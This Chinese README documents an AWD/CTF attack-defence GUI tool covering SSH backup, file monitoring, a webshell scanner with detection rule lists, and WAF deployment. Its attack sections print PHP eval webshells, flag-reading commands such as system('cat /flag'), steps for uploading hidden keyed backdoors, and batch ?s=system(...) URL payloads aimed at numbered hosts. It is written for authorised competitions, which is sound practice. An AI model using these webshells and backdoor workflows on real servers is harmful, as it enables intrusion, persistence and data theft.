# AWD Defence Tool v3.1 使用说明

这是一个面向 AWD/CTF 场景的辅助工具（图形界面版），包含 SSH 连接、源码打包下载、
文件监控、**木马查杀（WebShell 检测）**、WAF 部署、请求包审查、交互终端、
攻击辅助和 Bugku PVP 批量提交等功能。

请只在授权的 AWD/CTF 环境中使用。

## v3.1 相对 v3.0 的变化

- **移除命令行模式**：删除 `main.py`、`start_cli.bat`、`defence/task.py`、`defence/menu.py`，
  只保留图形界面
- **支持打包为独立 exe**：新增 `build.spec`，可构建单文件绿色版，
  目标机无需安装 Python 与依赖
- **新增冻结环境适配层** `defence/_bootstrap.py`：解决打包后
  「无法扫描包目录」与「数据写到临时目录会丢失」两个问题
- 数据目录（`tmp/`）在打包版中位于 **exe 同级目录**，程序退出不丢失

## v3.0 更新内容

新增 **一键木马查杀** 功能，检测引擎逆向自 D盾 2.1.8.1（`d_manage.dll`）：

- 支持 PHP / ASP / ASPX / JSP 四类脚本，17 种扩展名
- 683 条检测规则 + 26 条组合规则（危险函数链）
- **词边界匹配**：避免 `eval` 误命中 `reeval` 这类更长标识符
- **0/2/3 三级判定**：>= 阈值判恶意，>= 45% 阈值判可疑
- 覆盖 `.htaccess` / `.user.ini` / `php.ini` / `web.config` 配置后门
- 覆盖图片马（`.jpg/.png` 等 6 种图片里嵌 `<?php`）
- 远端扫描：`find` 列表 → 按需 `grep` 粗筛 → SFTP 拉回 → 本地精确判定 → 可选删除
- 本地扫描：直接扫描本地目录或已下载的源码包
- 自动生成报告到 `tmp/<host>/webshell_report_<时间>.txt`

GUI 对应「木马查杀」选项卡。

## 目录结构

```text
.
├── gui_main.py                     # GUI 入口
├── launcher.py                     # 环境自检 + 启动
├── start.bat                       # 双击启动（纯 ASCII，见下方说明）
├── build.spec                      # PyInstaller 打包配置
├── Attacker.py                     # 旧版辅助脚本（独立可用，不依赖本项目）
├── bugku_pvp_backdoor_submit.py    # 旧版 Bugku 提交脚本（独立可用）
├── requirements.txt                # Python 依赖
├── README.md / FIXES.md            # 使用说明 / 缺陷修复记录
├── defence/
│   ├── _bootstrap.py               # 冻结环境路径适配
│   ├── ssh.py                      # SSH/SFTP/交互 shell
│   ├── file_processing.py          # 文件监控、源码打包下载、备份部署
│   ├── webshell_scanner.py         # ★ 木马查杀引擎
│   ├── waf_manager.py              # WAF 上传、注入、下线、日志同步
│   ├── attacker_tools.py           # 探活、后门检测、命令执行、生成新后门、Bugku 提交
│   ├── state.py                    # 运行状态保存
│   └── phpwaf/                     # PHP WAF 模板（php5/7/8）
└── tmp/                            # 本地运行数据、源码包、WAF 日志、查杀报告
```

## 安装依赖

建议使用 Python 3.9+。

```bash
python -m pip install -r requirements.txt
```

## 启动方式

### 方式一：独立 exe（推荐，目标机无需 Python）

用打包版：把 `AWD-Defence-Tool-v3.1.exe` 拷到目标机双击即可。

数据目录 `tmp/` 会生成在 **exe 同级目录**。

### 方式二：源码运行

```bash
python launcher.py          # 自检依赖并启动界面
python launcher.py check    # 只做环境自检
```

或直接双击 `start.bat`。

> `start.bat` 保持纯 ASCII：cmd 会按**启动时**的代码页解码整个 bat 文件，
> `chcp` 只影响输出、无法补救已解码的内容，把中文写进 bat 会在部分环境下变乱码。
> 中文提示统一由 `launcher.py` 输出。

### 重新打包 exe

```bash
python -m pip install pyinstaller
python -m PyInstaller build.spec --noconfirm --clean
# 产物: dist/AWD-Defence-Tool-v3.1.exe
```

## GUI 使用说明

```bash
python gui_main.py
```

或双击 `start.bat`（会自动检查依赖）。

### 1. SSH 配置

用途：建立工具和比赛服务器之间的 SSH/SFTP 连接。文件监控、打包下载、备份部署、WAF、交互终端都依赖这个连接。

填写项：

- `主机(IP)`：服务器 IP 或域名。
- `端口(Port)`：默认 `22`。
- `用户名`：默认 `root`。
- `密码`：SSH 密码。

使用步骤：

1. 填写 SSH 信息。
2. 点击 `测试连接`。
3. 日志出现 `SSH 连接成功！` 后再使用其他远程功能。

注意：

- 连接成功后，连接信息会保存在当前程序运行状态里。
- 如果切换目标服务器，请重新在 SSH 页测试连接。

### 2. 文件监控

用途：监控远端 Web 目录内文件变化，发现新增文件、文件被修改等情况。可选择只监控，也可自动删除新增/修改文件。

填写项：

- `监控目录`：默认 `/var/www/html/`。
- `自动删除被更改/新增的文件`：勾选后会删除异常新增或修改文件。

使用步骤：

1. 先在 `SSH 配置` 中连接成功。
2. 填写要监控的目录。
3. 不勾选自动删除时，点击 `开始监控` 只记录变化。
4. 勾选自动删除时，点击 `开始监控` 会自动删除新增/修改文件。
5. 可点击 `暂停`、`继续`、`停止监控` 控制任务。

日志含义：

- `初检完成`：首次记录目录内文件 MD5。
- `新增文件`：发现新的非 `.http` 文件。
- `被更改`：已有文件 MD5 变化。
- `已删除文件`：自动删除模式下删除了异常文件。

注意：

- 自动删除有风险，建议先只监控，确认规则正常后再开启删除。
- `.http` 日志文件会被认为是 WAF 请求包日志，不作为异常文件删除。

### 3. 木马查杀

用于在 AWD 中发现对手上传的 WebShell，检测引擎逆向自 D盾 2.1.8.1。

**扫描模式**

- `远端(SSH)`：通过 SSH 扫描服务器上的 web 目录，默认 `/var/www/html/`
- `本地`：扫描本地目录，适合检查已下载的源码包（`tmp/<host>/sources/`）

**操作步骤**

1. 先在「SSH 配置」页测试连接（远端模式必须）
2. 切到「木马查杀」页，选择扫描模式
3. 填写目标路径（本地点「选择本地目录」可直接挑目录）
4. 按需调整判定阈值（默认 200）
5. 如需自动处置，勾选「自动删除恶意文件」
6. 点「开始查杀」，结果实时输出到下方日志区

**判定规则**

| 条件 | 结果 |
|---|---|
| `score >= 阈值` | 【恶意】level=3，勾选自动删除时会被删除 |
| `score >= 45% 阈值` | 【可疑】level=2，仅报告不删除 |
| 其他 | 干净，不出现在报告中 |

**结果说明**

日志区会显示每个命中文件的分值、类型、命中的特征串与组合规则，例如：

```text
【恶意】 level=3 score=385.0    PHP  /var/www/html/1.php
        命中: "eval"x2 | $_post[x2 | [组合]base64_decode + eval 一句话
```

扫描结束后可点「保存报告」导出到 `tmp/<host>/webshell_report_<时间>.txt`。

**阈值调整建议**

- 误报多：调高到 `300` 以上
- 漏报多（对手用了冷门马）：调低到 `120`，此时 `level=2` 的可疑项要人工确认
- AWD 常见场景建议保持 `200`，重点看组合规则命中项（`[组合]` 前缀）

**注意**：自动删除只删 `level=3` 的文件，`level=2` 一律保留。删除前会二次确认。

### 4. 打包下载

用途：通过 SSH 在远端打包源码目录，并下载到本地指定目录。

填写项：

- `打包目录`：远端要打包的目录，默认 `/var/www/html/`。
- `下载到`：本地保存目录，默认 `/home`。
- `备份包`：用于一键部署的本地 `.tar.gz` 文件。

打包下载步骤：

1. 先在 `SSH 配置` 中连接成功。
2. `打包目录` 填远端源码目录，例如 `/var/www/html/`。
3. `下载到` 填本地保存目录，例如 `/home`，也可以点击 `选择目录`。
4. 点击 `打包并下载`。
5. 成功后日志会显示下载路径。

一键部署步骤：

1. 选择一个本地备份包。
2. 确认 `打包目录` 是远端恢复目标目录。
3. 点击 `一键部署`。
4. 工具会上传备份包、清空远端目标目录、解压备份。

注意：

- 一键部署会清空远端目标目录，请确认目标目录和备份包正确。
- 下载目录默认是本机 `/home`，如果没有权限，请换成当前用户可写目录。

### 5. 攻击辅助

用途：整合旧版 `Attacker.py` 的功能，支持快速探活、读取存活目标、检测已知后门、用后门编号批量执行命令、生成新后门并上传。

这个页分为两块：左侧是 `探活与存活列表`，右侧是 `后门检测与命令执行`。

#### 4.1 快速探活并写入文件

填写项：

- `URL模板`：必须包含 `?`，工具会把 `?` 替换成编号。
- `编号`：起止编号。
- `存活文件`：探活结果保存路径，默认 `output.txt`。

示例：

```text
URL模板: http://192-168-1-?.pvp0000.example-awd.com/
编号: 1 到 255
存活文件: output.txt
```

点击 `快速探活并写入` 后，HTTP 状态码为 `200` 的目标会写入 `output.txt`，并加载到当前会话。

#### 4.2 从文件读入

如果已有目标列表，每行一个 URL：

```text
http://192-168-1-1.pvp0000.example-awd.com/
http://192-168-1-2.pvp0000.example-awd.com/
http://192-168-1-3.pvp0000.example-awd.com/
```

将 `存活文件` 填为这个文件路径，点击 `从文件读入`。

#### 4.3 检测已知后门

先加载存活目标，再填写后门参数。

普通 `eval` 后门示例：

```php
<?php @eval($_POST['cmd']); ?>
```

填写：

```text
后门路径: upload/.abc.php
key方式: 0 无
命令方式: 2 POST
参数名: cmd
```

点击 `检测已知后门`。如果某些目标上存在这个路径，右侧下拉框会出现类似：

```text
0: 5 urls payload=cmd known
```

带 key 后门示例：

```php
<?php if($_POST['pass']=='123456'){ @eval($_POST['a']); } ?>
```

填写：

```text
后门路径: shell.php
key方式: 2 POST
key 参数名: pass
key 值: 123456
命令方式: 2 POST
参数名: a
```

#### 4.4 执行命令

先从下拉框选择一个已检测到的后门，再填写 `执行内容`。

如果后门是：

```php
<?php @eval($_POST['cmd']); ?>
```

执行内容要写 PHP 代码：

```php
system('id');
```

或：

```php
system('cat /flag');
```

如果后门是：

```php
<?php system($_POST['cmd']); ?>
```

执行内容直接写系统命令：

```bash
id
```

点击 `执行命令` 后，工具会对该后门记录里的所有 URL 批量执行。

#### 4.5 生成新后门并上传

用途：通过已知可用后门，在目标 Web 目录写入一个新的隐藏 PHP 后门。

填写项：

- `写入目录`：远端文件系统目录，默认 `/var/www/html/`。
- 旁边的小输入框：Web 访问目录，默认 `/`。
- `生成带 key 后门`：勾选后生成带 key 校验的 POST eval 后门。

使用步骤：

1. 先检测出一个可用后门。
2. 从下拉框选择它。
3. 填写写入目录，例如 `/var/www/html/`。
4. 填写 Web 访问目录，例如 `/`，如果写入的是 `/var/www/html/upload/`，这里可填 `/upload/`。
5. 点击 `生成新后门并上传`。
6. 日志会输出新后门路径、key、payload，并自动加入下拉框。
7. 工具会自动保存当前后门配置到 `attacker_shells.json`。

注意：

- 普通后门默认是 `POST eval`。
- 带 key 后门会在日志里显示 key 参数名、key 值和 payload 参数名。
- 如果 Web 访问目录和远端文件系统目录不对应，新后门 URL 可能不可访问，需要手动调整。

#### 4.6 自动保存后门

生成新后门成功后，工具会自动保存到：

```text
attacker_shells.json
```

下次打开 GUI 时会自动加载这个文件，后门会直接出现在下拉框里。

保存内容包括：

- 后门 URL。
- key 传递方式。
- key 参数名和值。
- 命令参数传递方式。
- payload 参数名。
- 后门编号和备注。

例如你生成的带 key 后门：

```text
http://192-168-1-1.pvp0000.example-awd.com/.backdoor.php
key=MoLfnF
key值=5uXQWe
payload=dgVH1L
```

保存后，下次打开工具就能直接从下拉框选择这个后门。

#### 4.7 用已保存后门读 flag

适合每轮重复使用已经生成好的后门，不用重新填后门路径、key 和 payload。

使用步骤：

1. 从下拉框选择已生成或已加载的后门。
2. 在 `执行内容` 里填 PHP 代码：

```php
system('tac /f*');
```

3. 点击 `执行命令`。
4. 如果需要批量提交 flag，使用单独的 `Bugku提交` 页。

### 6. Bugku提交

用途：针对 Bugku PVP 场景，批量访问已知后门读取 flag，并提交到 Bugku。

填写项：

- `域名后缀`：例如 `pvp0000.example-awd.com`。
- `后门路径`：例如 `/cms/cms/include/admin.php`。
- `读取命令`：默认 `tac /f*`。
- `提交Token`：Bugku PVP 提交 token。
- `范围`：目标编号范围，例如 `1-255` 或 `1-10,22,30-40`。
- `排除`：不打的编号，例如 `243` 或 `1-10,243`。
- `线程`：并发数量，默认 `32`。
- `日志文件`：结果保存路径，默认 `bugku_pvp_results.jsonl`。
- `只探测不提交`：勾选后只读取 flag，不提交。

使用示例：

```text
域名后缀: pvp0000.example-awd.com
后门路径: /cms/cms/include/admin.php
读取命令: tac /f*
提交Token: 你的 token
范围: 1-255
排除: 243
线程: 32
日志文件: bugku_pvp_results.jsonl
```

点击 `开始批量提交` 后，工具会访问：

```text
http://192-168-1-X.<域名后缀><后门路径>?s=system('读取命令');
```

提取响应中的 flag，并提交到：

```text
https://ctf.bugku.com/pvp/submit.html?token=<token>&flag=<flag>
```

日志中：

- `flags=-` 表示未提取到 flag。
- `[submit]` 表示已提交。
- `status=ERR` 表示请求失败或超时。

点击 `停止` 会停止后续处理；已经发出的请求会等待返回。

### 7. WAF设置

用途：向远端 PHP 业务目录注入 WAF loader，拦截常见攻击请求，并保存可疑请求包。

填写项：

- `业务目录`：需要注入 WAF 的 Web 根目录，默认 `/var/www/html`。
- `隐藏目录`：远端 WAF 文件保存目录，默认 `/var/www/html/.phpwaf`。
- `日志目录`：远端请求包日志目录，默认 `/tmp/.phpwaf_logs`。
- `拦截方式`：
  - `1 关键词替换`：对危险关键词做替换。
  - `2 跳转路由`：匹配后跳转到指定路由。
- `严格程度`：
  - `1 简单`
  - `2 常见`
  - `3 全量`
- `跳转路由`：拦截方式为跳转路由时使用，默认 `/`。

一键上 WAF：

1. 先连接 SSH。
2. 填写业务目录、隐藏目录、日志目录。
3. 选择拦截方式和严格程度。
4. 点击 `一键上 WAF`。
5. 工具会检测远端 PHP 版本，上传对应 `waf_php5.php`、`waf_php7.php` 或 `waf_php8.php`。
6. 工具会向业务目录下所有 PHP 文件前面注入 WAF include。

启动自我防护：

- 点击 `启动自我防护` 后，工具会定期检查远端 WAF 文件是否缺失。
- 如果 WAF 文件被删除，会自动补传。
- 同时会定期同步远端 WAF 日志。

一键下 WAF：

- 点击 `一键下 WAF` 会从业务 PHP 文件中移除 WAF include，并删除远端 WAF 文件。

注意：

- WAF 已安装时，拦截方式和严格程度会锁定。需要调整时，先 `一键下 WAF`，再重新部署。
- 部署前 GUI 会提示是否清理本地历史请求包。

### 8. 数据包审查

用途：查看 WAF 同步到本地的原始请求包。

使用步骤：

1. 先在 `WAF设置` 中部署 WAF。
2. 启动自我防护，或触发 WAF 日志同步。
3. 切换到 `数据包审查` 页。
4. 左侧选择请求包，右侧查看原始 HTTP 请求内容。

日志保存位置：

```text
tmp/<hostname>/waf_logs/*.http
```

### 9. 系统日志

用途：查看当前工具运行状态。

显示内容：

- SSH 是否连接。
- 文件监控是否运行。
- WAF 是否安装。
- WAF 守护是否运行。
- WAF 拦截方式和严格程度。
- 远端 WAF 目录。
- 远端日志目录。
- 本地请求包数量。

点击 `刷新状态` 可手动刷新。

### 10. 交互终端

用途：在 GUI 中打开一个简单 SSH shell。

使用步骤：

1. 先在 `SSH 配置` 中连接成功。
2. 切换到 `交互终端` 页。
3. 工具会自动建立 shell。
4. 直接输入命令执行。

注意：

- 这是简易终端，适合执行常规命令。
- 复杂全屏程序、强交互程序不一定能完美显示。

## 代码模块说明

### gui_main.py

GUI 程序入口，包含所有页面布局和按钮事件。

主要类：

- `AWDDfenceGUI`：主窗口类。

主要页面创建函数：

- `create_ssh_tab()`：SSH 配置。
- `create_monitor_tab()`：文件监控。
- `create_tar_tab()`：打包下载和备份部署。
- `create_attacker_tab()`：攻击辅助。
- `create_bugku_tab()`：Bugku 批量提交。
- `create_waf_tab()`：WAF 设置。
- `create_packet_tab()`：数据包审查。
- `create_system_tab()`：系统日志。
- `create_shell_tab()`：交互终端。

如果要调整 GUI 控件或增加新页，主要改这个文件。

### defence/state.py

保存运行状态。

核心对象：

```python
state_manager
```

常用字段：

- `is_ssh`：SSH 是否已连接测试成功。
- `hostname`、`port`、`username`、`password`：SSH 信息。
- `remote_waf_dir`：远端 WAF 目录。
- `remote_waf_path`：远端 WAF 文件路径。
- `remote_waf_log_dir`：远端 WAF 日志目录。
- `waf_deployed`：WAF 是否部署。
- `waf_guard_enabled`：WAF 守护是否开启。
- `waf_mode`：WAF 拦截方式。
- `waf_strict_level`：WAF 严格程度。
- `waf_redirect_path`：WAF 跳转路由。

### defence/ssh.py

负责 SSH、SFTP 和 shell。

常用函数：

- `ssh_test()`：测试 SSH 连接，并写入 `state_manager`。
- `connect_ssh_client()`：根据当前状态创建 SSHClient。
- `connect_sftp_client()`：创建 SSHClient 和 SFTPClient。
- `run_ssh_command(ssh_client, command)`：执行远端命令。
- `shell()`：CLI 交互 shell。

### defence/file_processing.py

负责文件监控、源码打包下载、备份部署。

常用函数：

- `tar(remote_path=None, local_dir="/home", log_callback=print)`  
  打包远端目录并下载到本地目录。

- `deploy_tar(local_tar_path, remote_path="/var/www/html/", log_callback=print)`  
  上传本地备份包，清空远端目录并解压。

- `monitor_directory_changes(...)`  
  持续监控远端目录 MD5 变化，可自动删除异常文件。

- `batch_get_md5(ssh_client, directory_path, log_callback=print)`  
  批量获取远端目录文件 MD5。

- `batch_delete_files(ssh_client, file_paths, log_callback=print)`  
  批量删除远端文件。

本地源码包默认可保存到 `/home`，也可在 GUI/CLI 里指定。

### defence/webshell_scanner.py

木马查杀引擎（v3 新增），检测模型逆向自 D盾 2.1.8.1 的 `d_manage.dll`。

**对外接口**

```python
scan_local(target, threshold=200, workers=8, log_callback=print,
           auto_delete=False, extensions=None)
    # 扫描本地目录或单文件，返回 (results, total)

scan_remote(remote_dir="/var/www/html/", threshold=200,
            log_callback=print, auto_delete=False, use_grep_prefilter=True)
    # 通过 SSH 扫描远端，返回 (results, total)

format_report(results, total, threshold=200)   # 生成文本报告
save_report(results, total, out_path=None)     # 保存到 tmp/<host>/
```

**规则表**

| 规则组 | 条目数 | 代表特征 |
|---|---|---|
| `PHP_EXEC` | 7 | `system` / `exec` / `shell_exec` / `passthru` / `proc_open` |
| `PHP_EVAL` | 14 | `eval(` / `assert(` / `create_function(` / `preg_replace(` |
| `PHP_CALLBACK` | 20 | `array_map(` / `call_user_func(` / `uasort(` / `ReflectionFunction(` |
| `PHP_OBFUSC` | 13 | `base64_decode(` / `str_rot13(` / `gzinflate(` / `${` / `$$` |
| `PHP_FILE` | 13 | `file_put_contents(` / `fwrite(` / `move_uploaded_file(` |
| `PHP_NET` | 5 | `fsockopen(` / `socket_create(` / `curl_exec(` |
| `PHP_SUPER` | 12 | `$_POST[` / `php://input` / `phar://` / `data://` |
| `PHP_MARKER` | 5 | `phpinfo(` / `zend_` / `$i30:`（NTFS 数据流） |
| `ASP_ENTRIES` | 16 | `eval request(` / `CreateObject("WScript.Shell")` / `ExecuteGlobal` |
| `ASP_OBFUSC` | 11 | `VBScript.Encode` / `ascb(` / `charset=utf-7` |
| `ASP_EX` | 12 | `Server.MapPath(` / `CreateTextFile(` / `SaveToFile(` |
| `ASPX_ENTRIES` | 18 | `Assembly.Load` / `ProcessStartInfo` / `BinaryFormatter` |
| `JSP_ENTRIES` | 9 | `Runtime.getRuntime().exec` / `ProcessBuilder` / `URLClassLoader` |
| `HTACCESS_RULES` | 10 | `AddType` / `SetHandler` / `auto_prepend_file` / `application/x-httpd-php` |

另有 `COMBO_RULES` 26 条组合规则，命中即加 100~130 分，例如
`$_POST[` + `eval`、`base64_decode` + `eval`、`system` + `$_GET[`、
`create_function` + `base64_decode`、`System.Diagnostics.Process` + `Start(`。

**配置后门与图片马**

- `.htaccess` / `.user.ini` / `php.ini` / `web.config` / `.htpasswd` 会单独识别并按
  `HTACCESS_RULES` 判定（`RewriteEngine`/`RewriteRule` 属正常配置，不计分）
- 图片扩展名（`.jpg/.jpeg/.png/.gif/.bmp/.ico`）只取头部 16KB，检测"图片头 + 脚本标签"，
  命中加 150 分；无脚本标签的纯图片直接判净，不产生噪声

**词边界匹配**

`count_wordlike()` 还原 D盾 `0x61F7E4` 的边界检查：子串命中后检查前一字节
是否属于标识符字符（`[A-Za-z0-9_$]`），是则跳过。因此 `reevaluate`、
`my_eval_func` 不会触发 `eval` 规则，这是 D盾 误报低的关键。

**阈值与等级**

`level 3`（恶意）= `score >= threshold`；`level 2`（可疑）= `score >= threshold * 0.45`；
其余为 `level 0`（干净，不出现在报告中）。

### defence/waf_manager.py

负责 WAF 相关逻辑。

常用函数：

- `deploy_waf(...)`：部署 WAF，上传 WAF 文件并注入业务 PHP。
- `undeploy_waf(...)`：下线 WAF，移除注入并删除 WAF 文件。
- `check_and_restore_waf(...)`：检查远端 WAF 是否缺失，缺失则补传。
- `sync_remote_logs(...)`：同步远端 `.http` 请求包日志到本地。
- `list_local_request_logs(...)`：列出本地请求包日志。
- `read_local_request_log(file_path)`：读取请求包日志内容。
- `clear_local_request_logs(...)`：清理本地历史请求包。

WAF 会根据远端 PHP 版本选择：

- PHP 8+：`defence/phpwaf/waf_php8.php`
- PHP 7：`defence/phpwaf/waf_php7.php`
- PHP 5：`defence/phpwaf/waf_php5.php`

### defence/attacker_tools.py

负责攻击辅助和 Bugku 批量提交，是 `Attacker.py` 和 `bugku_pvp_backdoor_submit.py` 功能的新版封装。

常用类：

- `AttackerSession`：保存当前存活 URL 和已知后门。
- `BackdoorShell`：描述一组后门 URL、key、payload 等参数。
- `HttpResult`：HTTP 请求结果。

常用函数：

- `scan_alive(url_pattern, output_file="output.txt", start=0, end=255, ...)`  
  快速探活并写入文件。

- `read_active_file(path="output.txt", log_callback=print)`  
  从文件读取存活目标。

- `check_known_backdoor(active_urls, path, ...)`  
  检测存活目标上是否存在指定后门路径。

- `execute_shell_command(shell, command, ...)`  
  对已知后门批量执行命令。

- `upload_generated_backdoor(source_shell, remote_dir, url_dir, with_key, ...)`  
  通过已有后门写入新后门。

- `save_session(session, path="attacker_shells.json")`  
  保存当前后门配置。

- `load_session(path="attacker_shells.json")`  
  加载保存过的后门配置。

- `bugku_batch_submit(...)`  
  Bugku PVP 批量读取并提交 flag。

### defence/phpwaf/

PHP WAF 文件目录。

- `waf_php5.php`
- `waf_php7.php`
- `waf_php8.php`

工具部署 WAF 时会检测远端 PHP 主版本，并上传对应文件为远端 `waf.php`。

### Attacker.py

旧版攻击辅助脚本。包含探活、读文件、检测后门、执行命令、生成后门等功能。

现在推荐使用：

- GUI 的 `攻击辅助` 页。
- CLI 的 `attack` 命令。

### bugku_pvp_backdoor_submit.py

旧版 Bugku PVP 批量提交脚本。

现在推荐使用：

- GUI 的 `Bugku提交` 页。
- CLI 的 `bugku` 命令。

如果只想单独跑旧脚本，也可以：

```bash
python3 bugku_pvp_backdoor_submit.py --domain pvp0000.example-awd.com --range 1-255 --exclude 243
```

## 常见操作流程

### 比赛开始备份源码

1. 打开 GUI。
2. 在 `SSH 配置` 里连接服务器。
3. 到 `打包下载` 页。
4. `打包目录` 填 `/var/www/html/`。
5. `下载到` 选择本地目录。
6. 点击 `打包并下载`。

### 一键查杀木马

比赛过程中怀疑被种马时：

```text
scan
1                        # 远端查杀
/var/www/html/           # 目标目录
```

或在 GUI「木马查杀」页选「远端(SSH)」后点「开始查杀」。

确认有马后，可切到 `2`（自动删除）或在 GUI 勾选「自动删除恶意文件」再扫一次。

**AWD 实战建议**

- 每次对手轮次结束后跑一次 `scan`，比自己 `grep` 更省事
- 重点关注报告里带 `[组合]` 的行 —— 那是危险函数链，几乎可确定是马
- 对手常用 `.htaccess`、图片马（`.jpg` 里嵌 `<?php`）绕过，本引擎也覆盖这两类
- 如果对手用私藏冷门马，把阈值降到 `120`，人工看 `level=2` 项

### 开启文件监控

1. SSH 连接成功。
2. 到 `文件监控` 页。
3. `监控目录` 填 `/var/www/html/`。
4. 先不勾选自动删除，点击 `开始监控`。
5. 确认日志正常后，再按需要开启自动删除。

### 部署 WAF 并审查请求包

1. SSH 连接成功。
2. 到 `WAF设置` 页。
3. `业务目录` 填 `/var/www/html`。
4. 设置拦截方式、严格程度和跳转路由。
5. 点击 `一键上 WAF`。
6. 部署完成后点击 `启动自我防护`。
7. 到 `数据包审查` 页查看同步到本地的请求包。

### 使用攻击辅助批量执行

1. 到 `攻击辅助` 页。
2. 通过 URL 模板探活，或从 `output.txt` 读取目标。
3. 填写后门路径、key、payload。
4. 点击 `检测已知后门`。
5. 选择检测出的后门。
6. 在 `执行内容` 中输入 PHP 代码或系统命令。
7. 点击 `执行命令`。

### 使用已生成后门每轮读取 flag

1. 第一次通过 `生成新后门并上传` 生成后门。
2. 工具会自动保存 `attacker_shells.json`。
3. 下一轮打开工具后，到 `攻击辅助` 页，后门会自动加载。
4. 选择保存过的后门。
5. `执行内容` 填 `system('tac /f*');`。
6. 点击 `执行命令`。
7. 需要批量提交时，到 `Bugku提交` 页处理。

### Bugku PVP 批量提交

1. 到 `Bugku提交` 页。
2. 填写域名后缀、后门路径、读取命令、token。
3. 设置范围和排除编号。
4. 可先勾选 `只探测不提交` 测试。
5. 确认正常后取消勾选，点击 `开始批量提交`。

## 常见问题

### 连接 SSH 失败

检查：

- IP/域名是否正确。
- 端口是否正确。
- 用户名密码是否正确。
- 比赛环境是否允许 SSH。
- 本机是否能访问目标网络。

### 打包下载失败

检查：

- 是否已经 SSH 连接成功。
- 远端打包目录是否存在。
- 远端当前用户是否有读取权限。
- 本地下载目录是否存在或可写。

### 一键部署后网站异常

一键部署会清空目标目录并解压备份。检查：

- 是否选错远端目录。
- 备份包内部目录结构是否正确。
- 解压后文件是否多了一层目录。

### WAF 部署失败

检查：

- 远端是否安装 PHP 命令。
- 业务目录是否存在。
- SSH 用户是否有写业务目录的权限。
- 隐藏目录和日志目录是否可创建。

### WAF 请求包没有同步

检查：

- WAF 是否已部署。
- 是否启动了自我防护。
- 远端日志目录是否正确。
- 目标请求是否真的触发 WAF。

### 后门检测不到

检查：

- 是否已经加载存活目标。
- 后门路径是否正确。
- 路径开头带不带 `/` 都可以，但不要把完整域名写进后门路径。
- 目标是否需要特殊 Host、Cookie 或认证。
- 后门是否只支持 POST 或只支持 GET。

### 执行命令没有输出

检查后门类型：

- `eval($_POST['cmd'])`：执行内容要写 PHP 代码，例如 `system('id');`。
- `system($_POST['cmd'])`：执行内容要写系统命令，例如 `id`。

### Bugku 提交失败

检查：

- token 是否正确。
- 后门路径是否正确。
- 域名后缀是否正确。
- 范围是否包含自己的靶机，需要用 `排除` 跳过。
- 是否勾选了 `只探测不提交`。

## 运行数据位置

源码备份默认保存位置：

```text
/home
```

如果在 GUI/CLI 中指定了其他目录，则保存到指定目录。

WAF 请求包本地保存位置：

```text
tmp/<hostname>/waf_logs/
```

源码备份历史目录也可能出现在：

```text
tmp/<hostname>/sources/
```

Bugku 批量提交日志默认：

```text
bugku_pvp_results.jsonl
```

攻击辅助保存的后门配置默认：

```text
attacker_shells.json
```

攻击辅助读取 flag 的结果默认：

```text
attacker_flag_results.jsonl
```

## 开发和检查

语法检查：

```bash
python -m py_compile gui_main.py launcher.py defence/*.py
```

GUI 导入检查：

```bash
python3 -c "import gui_main; print('ok')"
```

新增 GUI 功能时，建议同时检查：

- 是否需要 SSH 连接。
- 是否需要后台线程，避免界面卡死。
- 是否要把日志通过 `log_callback` 输出。
- 是否要更新 `state_manager` 状态。
